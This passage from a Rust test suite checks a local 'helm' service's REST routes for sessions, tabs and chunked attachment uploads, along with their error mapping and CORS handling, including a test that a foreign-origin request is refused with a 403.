        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            "no such session: sess-missing",
            "the helm's own refusal must name the id it could not place"
        );

        peer.await.unwrap();
    }

    /// A title the supervisor refuses (control characters, per PLAN_M5.md
    /// item 3's validation) must surface as a 400 carrying the
    /// supervisor's own refusal text — the UI's only source for that
    /// message, since this route performs no local validation of its own
    /// to phrase a redundant one from.
    #[tokio::test]
    async fn rename_session_invalid_title_returns_400_with_supervisor_message() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-rename-e91f: title must not contain control characters";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::RenameSession { req_id, .. } = request else {
                panic!("expected RenameSession, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::InvalidRequest,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/rename")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({ "title": "bad\u{7}title" }).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::BAD_REQUEST);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "body must carry the supervisor's own refusal text verbatim"
        );

        peer.await.unwrap();
    }

    /// `POST /api/sessions/{id}/tabs` happy path (PLAN_M4.md item 5): the
    /// scripted `TabOpened` reply's `TabInfo` must round-trip through the
    /// success body under a `tab` key — the shape a client needs before it
    /// can attach the new tab via `?tab=<id>` on `term_ws`.
    #[tokio::test]
    async fn open_tab_happy_path_returns_200_with_tab() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, TabInfo};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::OpenTab { req_id, session_id } = request else {
                panic!("expected OpenTab, got {request:?}");
            };
            assert_eq!(session_id, "sess-1");
            writer
                .write_control(&ControlMsg::TabOpened {
                    req_id,
                    tab: TabInfo { id: "tab-1".into() },
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/tabs")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["tab"]["id"], "tab-1");

        peer.await.unwrap();
    }

    /// `DELETE /api/sessions/{id}/tabs/{tab_id}` happy path, mirroring
    /// `stop_session_happy_path_returns_200_with_empty_object_body`: a
    /// scripted `TabClosed` reply must reach the caller as 200 with the
    /// same empty-object body every no-payload success shares. The peer
    /// asserts both path segments landed in the right `CloseTab` fields —
    /// a route that swapped `id`/`tab_id` would still 200 here, just
    /// against the wrong tab.
    #[tokio::test]
    async fn close_tab_happy_path_returns_200_with_empty_object_body() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CloseTab {
                req_id,
                session_id,
                tab_id,
            } = request
            else {
                panic!("expected CloseTab, got {request:?}");
            };
            assert_eq!(session_id, "sess-1");
            assert_eq!(tab_id, "tab-1");
            writer
                .write_control(&ControlMsg::TabClosed { req_id })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/sessions/sess-1/tabs/tab-1")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value, serde_json::json!({}));

        peer.await.unwrap();
    }

    /// `POST /api/sessions/{id}/tabs` must map a supervisor `Error` reply
    /// to the right HTTP status AND carry its message through verbatim.
    /// `http_error`'s own unit tests already pin the full four-`ErrorKind`
    /// table exhaustively, so this route owes only ONE representative
    /// case through the real handler — `NotFound`, the same choice
    /// `stop_session_unknown_id_returns_404_with_supervisor_message` made
    /// for the same reason. The body assertion is the COMPLETE sentinel,
    /// not a substring: a handler that truncated or rewrapped the
    /// supervisor's message would still pass a status-only check here,
    /// which is exactly the gap an exact-body assertion closes.
    #[tokio::test]
    async fn open_tab_error_reply_maps_to_404_with_the_supervisors_message() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-open-tab-3f1a2c: no such session";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::OpenTab { req_id, .. } = request else {
                panic!("expected OpenTab, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::NotFound,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/tabs")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "body must carry the supervisor's own message verbatim, not a substring of it"
        );

        peer.await.unwrap();
    }

    /// `DELETE /api/sessions/{id}/tabs/{tab_id}`'s twin of
    /// `open_tab_error_reply_maps_to_404_with_the_supervisors_message` —
    /// same reasoning (one representative `ErrorKind`, exact-body
    /// assertion), aimed at `close_tab` instead so a route wired to the
    /// wrong client method (or dropping `http_error` entirely) cannot hide
    /// behind the open-tab coverage above.
    #[tokio::test]
    async fn close_tab_error_reply_maps_to_404_with_the_supervisors_message() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-close-tab-9d4e17: no such tab";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CloseTab { req_id, .. } = request else {
                panic!("expected CloseTab, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::NotFound,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/sessions/sess-1/tabs/tab-1")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "body must carry the supervisor's own message verbatim, not a substring of it"
        );

        peer.await.unwrap();
    }

    /// `POST /api/sessions/{id}/attachments` happy path (PLAN_M4.md item
    /// 5, the pinned attachment REST contract): a body larger than one
    /// `UPLOAD_CHUNK_BYTES` streams as `BeginUpload` -> N data frames ->
    /// `CommitUpload`, and the published path comes back verbatim under
    /// `{"path": ...}`.
    ///
    /// The body is built as ONE `Body::from` buffer deliberately — a
    /// single HTTP body chunk with no relation to `UPLOAD_CHUNK_BYTES` —
    /// and the peer asserts the exact frame BOUNDARIES, not merely that
    /// the bytes reassemble. That makes this the pinned test for the
    /// contract's "rechunked at UPLOAD_CHUNK_BYTES regardless of body
    /// chunking" in the one-giant-chunk direction; the opposite direction
    /// (many small body chunks coalescing into full frames) is
    /// `upload_attachment_rechunks_irregular_streaming_body_chunks`.
    #[tokio::test]
    async fn upload_attachment_happy_path_streams_chunks_and_returns_the_path() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES};
        use tower::ServiceExt;

        let total = UPLOAD_CHUNK_BYTES * 2 + 500;
        let content: Vec<u8> = (0..total).map(|i| (i % 256) as u8).collect();

        let (client_side, peer_side) = tokio::io::duplex(4 * 1024 * 1024);
        let peer = tokio::spawn({
            let content = content.clone();
            async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::BeginUpload {
                    req_id,
                    session_id,
                    channel,
                    size,
                    ..
                } = request
                else {
                    panic!("expected BeginUpload, got {request:?}");
                };
                assert_eq!(session_id, "sess-1");
                assert_eq!(
                    size, total as u64,
                    "declared size must be the request's Content-Length"
                );
                writer
                    .write_control(&ControlMsg::UploadStarted { req_id, channel })
                    .await
                    .unwrap();

                // Read every data frame until the whole body is accounted
                // for, checking the split points and byte-for-byte
                // fidelity: a rechunking bug that reordered or duplicated
                // bytes must fail this too, not only one that split at
                // the wrong size.
                let mut reassembled = Vec::new();
                let mut lens = Vec::new();
                while reassembled.len() < content.len() {
                    let frame = reader.read_frame().await.unwrap().unwrap();
                    assert_eq!(frame.channel, channel);
                    lens.push(frame.body.len());
                    reassembled.extend_from_slice(&frame.body);
                }
                assert_eq!(
                    lens,
                    vec![UPLOAD_CHUNK_BYTES, UPLOAD_CHUNK_BYTES, 500],
                    "one HTTP body buffer must still land on the wire as UPLOAD_CHUNK_BYTES \
                     frames, with only the final piece short"
                );
                assert_eq!(reassembled, content);

                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::CommitUpload { req_id, .. } = request else {
                    panic!("expected CommitUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadCommitted {
                        req_id,
                        path: "/data/sessions/sess-1/attachments/screenshot.png".to_string(),
                    })
                    .await
                    .unwrap();
            }
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments?filename=screenshot.png")
            .header("host", "127.0.0.1:7433")
            .header("content-length", total.to_string())
            .body(axum::body::Body::from(content))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(
            value["path"],
            "/data/sessions/sess-1/attachments/screenshot.png"
        );

        peer.await.unwrap();
    }

    /// The other rechunking direction, and the one a per-body-chunk relay
    /// silently fails: a body arriving as many IRREGULAR pieces, all
    /// smaller than `UPLOAD_CHUNK_BYTES` and none a divisor of it, must
    /// still reach the wire as full-sized frames with only the final piece
    /// short. Forwarding each body chunk as its own frame would reassemble
    /// to the same bytes — which is why the happy path alone cannot catch
    /// it — while putting hundreds of undersized frames on a connection
    /// whose framing discipline exists to bound exactly that.
    ///
    /// The sizes deliberately do not line up with the chunk boundary, so
    /// frames end mid-piece and a coalescing bug that only worked for
    /// aligned inputs fails here.
    #[tokio::test]
    async fn upload_attachment_rechunks_irregular_streaming_body_chunks() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES};
        use tower::ServiceExt;

        // Repeating sizes that share no factor with UPLOAD_CHUNK_BYTES,
        // so every protocol frame boundary lands inside a body piece.
        let piece_sizes: [usize; 4] = [1000, 7777, 33_333, 101];
        let mut pieces = Vec::new();
        let mut content = Vec::new();
        while content.len() < UPLOAD_CHUNK_BYTES * 2 {
            let size = piece_sizes[pieces.len() % piece_sizes.len()];
            let piece: Vec<u8> = (0..size)
                .map(|i| ((content.len() + i) % 251) as u8)
                .collect();
            content.extend_from_slice(&piece);
            pieces.push(piece);
        }
        let total = content.len();
        let expected_lens: Vec<usize> =
            std::iter::repeat_n(UPLOAD_CHUNK_BYTES, total / UPLOAD_CHUNK_BYTES)
                .chain(std::iter::once(total % UPLOAD_CHUNK_BYTES))
                .filter(|len| *len > 0)
                .collect();

        let (client_side, peer_side) = tokio::io::duplex(4 * 1024 * 1024);
        let peer = tokio::spawn({
            let content = content.clone();
            async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::BeginUpload {
                    req_id, channel, ..
                } = request
                else {
                    panic!("expected BeginUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadStarted { req_id, channel })
                    .await
                    .unwrap();

                let mut lens = Vec::new();
                let mut reassembled = Vec::new();
                while reassembled.len() < content.len() {
                    let frame = reader.read_frame().await.unwrap().unwrap();
                    lens.push(frame.body.len());
                    reassembled.extend_from_slice(&frame.body);
                }
                assert_eq!(
                    lens, expected_lens,
                    "irregular body pieces must be coalesced into UPLOAD_CHUNK_BYTES frames, not \
                     forwarded one frame per body chunk"
                );
                assert_eq!(
                    reassembled, content,
                    "rechunking must preserve every byte in order"
                );

                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::CommitUpload { req_id, .. } = request else {
                    panic!("expected CommitUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadCommitted {
                        req_id,
                        path: "/tmp/pub.bin".to_string(),
                    })
                    .await
                    .unwrap();
            }
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let body_stream =
            futures_util::stream::iter(pieces.into_iter().map(Ok::<Vec<u8>, std::io::Error>));
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", total.to_string())
            .body(axum::body::Body::from_stream(body_stream))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        peer.await.unwrap();
    }

    /// The desktop build's `fetch` preflights before it may upload
    /// anything, because `fetch(url, {body: file})` sets a content type
    /// the CORS-simple rules do not cover. Without an `OPTIONS` route that
    /// answers with the allowed method and header, the browser stops
    /// there and the desktop attachment flow never sends a byte.
    ///
    /// Pinned per header rather than "some CORS headers exist": each one
    /// is separately load-bearing, and a preflight missing any of them
    /// fails in a way whose only symptom is an upload that never happens.
    #[tokio::test]
    async fn attachment_preflight_answers_the_desktop_webview_origin() {
        use tower::ServiceExt;

        let harness = rest_harness::idle_helm().await;

        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("OPTIONS")
            .uri("/api/sessions/sess-1/attachments?filename=shot.png")
            .header("host", "127.0.0.1:7433")
            .header("origin", "dioxus://index.html")
            .header("access-control-request-method", "POST")
            .header("access-control-request-headers", "content-type")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NO_CONTENT);
        let headers = response.headers();
        assert_eq!(
            headers["access-control-allow-origin"], "dioxus://index.html",
            "the origin is echoed, not answered with a wildcard"
        );
        assert_eq!(headers["access-control-allow-methods"], "POST, OPTIONS");
        assert_eq!(headers["access-control-allow-headers"], "content-type");
        assert_eq!(
            headers["vary"], "Origin",
            "one origin's answer must not be cached for another"
        );
        assert!(headers.contains_key("access-control-max-age"));
    }

    /// The upload itself: a successful POST from the desktop webview's
    /// origin must come back READABLE, or the page is told nothing while
    /// the file sits published on the host — the worst available failure,
    /// since the user is shown an error for an attachment that exists.
    #[tokio::test]
    async fn a_successful_upload_is_readable_by_the_desktop_webview() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let content = b"desktop-upload".to_vec();
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn({
            let len = content.len();
            async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::BeginUpload {
                    req_id, channel, ..
                } = request
                else {
                    panic!("expected BeginUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadStarted { req_id, channel })
                    .await
                    .unwrap();
                let mut received = 0;
                while received < len {
                    received += reader.read_frame().await.unwrap().unwrap().body.len();
                }
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::CommitUpload { req_id, .. } = request else {
                    panic!("expected CommitUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadCommitted {
                        req_id,
                        path: "/state/attachments/sess-1/shot.png".to_string(),
                    })
                    .await
                    .unwrap();
            }
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments?filename=shot.png")
            .header("host", "127.0.0.1:7433")
            .header("origin", "wry://localhost")
            .header("content-length", content.len().to_string())
            .body(axum::body::Body::from(content))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        assert_eq!(
            response.headers()["access-control-allow-origin"],
            "wry://localhost"
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["path"], "/state/attachments/sess-1/shot.png");
        peer.await.unwrap();
    }

    /// The half that a handler-level CORS implementation gets wrong: an
    /// ERROR response has to be readable too.
    ///
    /// SPEC.md requires upload failures to be visible, and a response the
    /// webview refuses to hand back is a failure with no message at all —
    /// the browser reports a generic network error and the supervisor's
    /// own words (the whole point of the pinned contract's verbatim error
    /// body) never reach the user.
    #[tokio::test]
    async fn a_refused_upload_is_readable_by_the_desktop_webview_too() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        // A SUPERVISOR-side refusal, aimed at a session the helm does know:
        // an id the merged view has never heard of is refused by the helm
        // itself now (PLAN_M6.md item 5), which would exercise the wrong
        // path for a test about what a cross-origin page can READ.
        const SENTINEL: &str = "the session's attachments directory is gone";
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload { req_id, .. } = request else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::NotFound,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments?filename=shot.png")
            .header("host", "127.0.0.1:7433")
            .header("origin", "dioxus://index.html")
            .header("content-length", "4")
            .body(axum::body::Body::from("data"))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        assert_eq!(
            response.headers()["access-control-allow-origin"],
            "dioxus://index.html",
            "an error the page cannot read is a failure with no message"
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(String::from_utf8_lossy(&body).contains(SENTINEL));
        peer.await.unwrap();
    }

    /// The CORS headers must not widen what the loopback guard allows.
    ///
    /// A page on another origin is refused before it reaches the route at
    /// all, and — the part worth pinning — the refusal carries NO
    /// `Access-Control-Allow-Origin`, so the attacker's page cannot even
    /// read the 403. Handing one back would turn a refusal into a probe
    /// that confirms a helm is listening.
    #[tokio::test]
    async fn a_foreign_origin_is_refused_without_cors_headers() {
        use tower::ServiceExt;

        let harness = rest_harness::idle_helm().await;

        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments?filename=shot.png")
            .header("host", "127.0.0.1:7433")
            .header("origin", "https://attacker.example")
            .header("content-length", "4")
            .body(axum::body::Body::from("data"))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::FORBIDDEN);
        assert!(
            !response
                .headers()
                .contains_key("access-control-allow-origin"),
            "a refused origin must not be handed the means to read the refusal"
        );
    }

    /// A zero-byte attachment is an ordinary upload, not a refusal: the
    /// pinned contract has no minimum size, and an empty file is a
    /// perfectly reasonable thing to paste. `BeginUpload` declares 0, no
    /// data frames follow, and the commit publishes — the shape a relay
    /// that treated "no bytes to send" as "nothing to do" would break by
    /// never committing at all.
    #[tokio::test]
    async fn upload_attachment_zero_byte_body_publishes() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id,
                channel,
                size,
                ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            assert_eq!(size, 0, "an empty body must declare a size of zero");
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            // The very next frame must be the commit: an empty upload
            // sends no data frames at all.
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CommitUpload { req_id, .. } = request else {
                panic!("expected CommitUpload with no data frames before it, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::UploadCommitted {
                    req_id,
                    path: "/tmp/empty.txt".to_string(),
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments?filename=empty.txt")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "0")
            .body(axum::body::Body::empty())
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(value["path"], "/tmp/empty.txt");
        peer.await.unwrap();
    }

    /// A body LONGER than its declared `Content-Length` must be refused as
    /// an invalid request (400), with the excess never forwarded.
    ///
    /// The pinned contract requires a size mismatch to fail, and this
    /// direction has to fail HERE: past `UploadStarted` the supervisor has
    /// no pending `req_id` left to answer with a correlated
    /// `InvalidRequest`, so an overrun would reach the browser as an
    /// uncorrelated 500-class abort — the wrong class for a request whose
    /// own framing was wrong. The peer proves the excess never reached the
    /// wire: after the in-bounds prefix it must see `AbortUpload`, not
    /// more data and not a commit.
    #[tokio::test]
    async fn upload_attachment_body_longer_than_content_length_is_refused() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES};
        use tower::ServiceExt;

        // Exactly one frame's worth, so the in-bounds prefix is
        // observable on the wire before the overrun ends the transfer.
        let declared = UPLOAD_CHUNK_BYTES as u64;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id,
                channel,
                size,
                ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            assert_eq!(size, declared);
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            // The first piece fits the declaration and is forwarded...
            let frame = reader.read_frame().await.unwrap().unwrap();
            assert_eq!(frame.body.len(), declared as usize);
            // ...and the overrun ends the transfer instead of extending it.
            let next = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            assert!(
                matches!(next, ControlMsg::AbortUpload { channel: c } if c == channel),
                "an overlong body must abort, never commit or forward the excess: {next:?}"
            );
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let body_stream = futures_util::stream::iter(vec![
            Ok::<Vec<u8>, std::io::Error>(vec![1u8; declared as usize]),
            Ok::<Vec<u8>, std::io::Error>(vec![2u8; 40]),
        ]);
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", declared.to_string())
            .body(axum::body::Body::from_stream(body_stream))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::BAD_REQUEST,
            "a body that outruns its own Content-Length is the caller's error, not the \
             supervisor's"
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(
            String::from_utf8_lossy(&body).contains("longer than the declared Content-Length"),
            "the body must name the mismatch: {}",
            String::from_utf8_lossy(&body)
        );

        peer.await.unwrap();
    }

    /// A size mismatch the SUPERVISOR detects — the short-body case, and
    /// whatever else it decides at commit — must pass through this route
    /// untouched: its status class from `ErrorKind`, its message verbatim.
    /// The helm has no business rewording a commit refusal, and a locally
    /// invented "upload failed" would strip exactly the detail SPEC.md
    /// requires the user to see.
    ///
    /// Both mismatch directions are exercised because their sentinels are
    /// the only difference: the relay must be equally transparent to a
    /// commit refusal whichever way the counts disagreed.
    #[tokio::test]
    async fn upload_attachment_commit_mismatch_passes_the_sentinel_through() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SHORT: &str = "SENTINEL-commit-short-2b7e: declared 10 bytes, received 4";
        const LONG: &str = "SENTINEL-commit-long-2b7e: declared 10 bytes, received 12";

        for sentinel in [SHORT, LONG] {
            let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
            let peer = tokio::spawn(async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::BeginUpload {
                    req_id, channel, ..
                } = request
                else {
                    panic!("expected BeginUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::UploadStarted { req_id, channel })
                    .await
                    .unwrap();

